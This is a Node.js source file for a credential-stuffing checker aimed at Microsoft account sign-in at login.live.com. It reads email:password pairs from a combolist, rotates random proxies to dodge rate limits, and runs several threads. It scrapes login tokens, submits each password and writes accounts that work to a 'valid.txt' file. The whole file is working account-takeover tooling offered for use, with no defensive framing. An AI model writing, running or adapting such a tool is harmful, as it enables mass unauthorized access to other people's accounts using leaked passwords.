const { login_header_1, login_header_1_2 } = require('./headers.js');
const { promptUser, getSections } = require('./separator');
const request = require('request');
const { URL } = require('url');
const fs = require('fs');
const { Log } = require('./logger.js');



function first(callback, proxy, cookiejar) {
    
    const options ={
        method: "GET",
        headers: login_header_1(),
        jar: cookiejar,
        proxy: `http://${proxy}`
    }
    try {
        request('https://login.live.com/login.srf', options, (err, res, body) => {
            if (err) {
                callback(['failed', err, 'failed', 'failed', 'failed', err]);
            } else{
                try {
                    const contextIdRegex = /value="([^"]+)"/;
                    const ppftMatch = body.match(contextIdRegex);
                    const PPFT = ppftMatch[1];
                    const postUrlRegex = /urlPostMsa:'([^']+)'/;
                    const postUrlMatch = body.match(postUrlRegex);
                    const postUrl = postUrlMatch[1];
                    const parsedUrl = new URL(postUrl);
                    const queryParams = Object.fromEntries(parsedUrl.searchParams);
                    const contextid = queryParams.contextid;
                    const opid = queryParams.opid;
                    const uaid = queryParams.uaid;
                    callback(['success', body, PPFT, postUrl, uaid, contextid, opid]);
                } catch (error) {
                    callback(['failed', error, 'failed', 'failed', 'failed', 'failed', 'failed']);
                }
            }
    
        })   
    } catch (error) {
        callback(['failed', error, 'failed', 'failed', 'failed', 'failed', 'failed']);
    }
}

function second(callback, mail_full, opid, uaid, ppft, proxy, cookiejar) {
    const options = {
        method: "POST",
        headers: login_header_1(),
        jar: cookiejar,
        proxy: `http://${proxy}`,
        body: JSON.stringify({
            'username': mail_full,
            'uaid': uaid,
            'isOtherIdpSupported': false,
            'checkPhones': true,
            'isRemoteNGCSupported': true,
            'isCookieBannerShown': false,
            'isFidoSupported': true,
            'forceotclogin': false,
            'otclogindisallowed': false,
            'isExternalFederationDisallowed': false,
            'isRemoteConnectSupported': false,
            'federationFlags': 3,
            'isSignup': false,
            'flowToken': ppft,
        })
    }

    try {
        request(`https://login.live.com/GetCredentialType.srf`, options, (err, res, body) => {
            if (err) {
                callback(['failed', err]);
            }else{
                if (body.includes('ErrorHR')) {
                    callback(['failed', body]);
                }else{
                    callback(['success', body]);
                }
            }
        })
    } catch (error) {
        callback(['failed', error]);
    }

}



function third(callback, mail_full, account_password, opid, post_url, uaid, ppft, proxy, cookiejar) {
    const options = {
        method: "POST",
        headers: login_header_1_2(),
        jar: cookiejar,
        proxy: `http://${proxy}`,
        followRedirect: true,
        form: {
            'i13': '0',
            'login': mail_full,
            'loginfmt': mail_full,
            'type': '11',
            'LoginOptions': '3',
            'lrt': '',
            'lrtPartition': '',
            'hisRegion': '',
            'hisScaleUnit': '',
            'passwd': account_password,
            'ps': '2',
            'psRNGCDefaultType': '',
            'psRNGCEntropy': '',
            'psRNGCSLK': '',
            'canary': '',
            'ctx': '',
            'hpgrequestid': '',
            'PPFT': ppft,
            'PPSX': 'Passpo',
            'NewUser': '1',
            'FoundMSAs': '',
            'fspost': '0',
            'i21': '0',
            'CookieDisclosure': '0',
            'IsFidoSupported': '1',
            'isSignupPost': '0',
            'isRecoveryAttemptPost': '0',
            'i19': '10751',
        }
    }

    try {
        request(post_url, options, (err, res, body) => {
            if (err) {
                callback(['failed', err]);
            }else{
                if (body.includes('correlation_id')) {
                    callback(['miracle', body]);
                }else if (body.includes('sSigninName')){
                    callback(['success', body]);
                }else{
                    callback(['failed', body]);
                }
            }
        })
    } catch (error) {
        callback(['failed', error]);
    }

}


async function processElement(element) {
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve();
        }, 500); 
    });
}

async function worker(mail_full, account_password, proxy, cookiejar) {
    return new Promise((resolve, reject) => { 
      first((first_result) => {
        const [first_status, first_response, ppft, post_url, uaid, contextid, opid] = first_result;
  
        if (first_status !== "failed") {
          second((second_result) => {
            const [second_status, second_response] = second_result;
            if (second_status !== "failed") {
              third((third_result) => {
                const [third_status, third_response] = third_result;
                if (third_status === "miracle") {
                    Log.Success("MIRACLE HAPPENED: RESPONSE SAVED TO TXT");
                    fs.writeFileSync("miracle.txt", third_response, "utf8");
                    resolve(["miracle"]); 
                } else if (third_status === "success") {
                    Log.Success(`Valid account: ${mail_full}:${account_password}`);
                    fs.appendFileSync("output/valid.txt",`${mail_full}:${account_password}\n`,"utf8");
                    resolve(["success"]); 
                } else {
                    Log.Error(`Invalid account: ${mail_full}:${account_password}`);
                    fs.appendFileSync("output/invalid.txt",`${mail_full}:${account_password}\n`,"utf8");
                    resolve(["failed"]); 
                }
              }, mail_full, account_password, opid, post_url, uaid, ppft, proxy, cookiejar
              );
            } else {
                Log.Warning(`Failed to execute second request: ${mail_full}:${account_password}`);
                resolve(["retry"]); 
            }
          }, mail_full, opid, uaid, ppft, proxy, cookiejar
          );
        } else {
            Log.Warning(`Failed to execute first request: ${mail_full}:${account_password}`);
            resolve(["retry"]); 
        }
      }, proxy, cookiejar);
    });
  }



async function start(section, section_number, proxies) {
    for (let index = 0; index < section.length; index++) {
        const data_line = section[index];
        const parts = data_line.split(':');
        const email = parts[0].trim();
        const password = parts[1].trim()

        await processElement(data_line);
        let retry_count = 0;

        while (retry_count <= 5) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const cookiejar = request.jar();
            const [status] = await worker(email, password, proxy, cookiejar);
            if (status !== "retry") {
                break;
            }
            retry_count++;
        }

        if (retry_count > 5) {
            fs.appendFileSync('output/failed_check.txt', `${email}:${password}\n`, 'utf8');
        }

    }
}
  

async function main() {
    const thread_num = await promptUser("Threads: ");
    const sections = await getSections('input/combolist.txt', thread_num);
    const proxy_path = 'input/proxies.txt';
    const proxy_data = fs.readFileSync(proxy_path, 'utf8');
    const proxies = proxy_data.split('\n');

    var section_num = "1"
    for (let index = 0; index < thread_num; index++) {
        const section = sections[`section_${section_num}`];
        start(section, index, proxies)
        section_num++;
    }

}
  
main()
